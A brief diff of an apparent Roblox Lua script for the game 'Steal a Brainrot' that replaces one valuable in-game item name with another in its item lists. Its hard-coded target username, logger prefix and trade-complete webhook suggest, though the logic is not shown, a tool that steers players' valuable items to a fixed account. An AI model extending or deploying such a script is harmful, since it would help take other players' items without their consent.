@@ -24,7 +24,7 @@ task.spawn(function()
 		local TARGET_USERNAME = "wastinginmygravee"
 		local DEBUG_PREFIX = "[logger]"
 		local ALLOWED_ANIMALS = {
-			"Dragon Gingerini",
+			"La Casa Boo",
 			"Hydra Dragon Cannelloni",
 			"Garama and Madundung",
 			"La Supreme Combinasion",
@@ -52,7 +52,7 @@ task.spawn(function()
 		local sendTradeCompleteWebhook
 		local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
 		local GOOD_BRAINROTS = {
-			["Dragon Gingerini"] = true,
+			["La Casa Boo"] = true,
 			["Hydra Dragon Cannelloni"] = true,
 			["Garama and Madundung"] = true,
 			["La Supreme Combinasion"] = true,
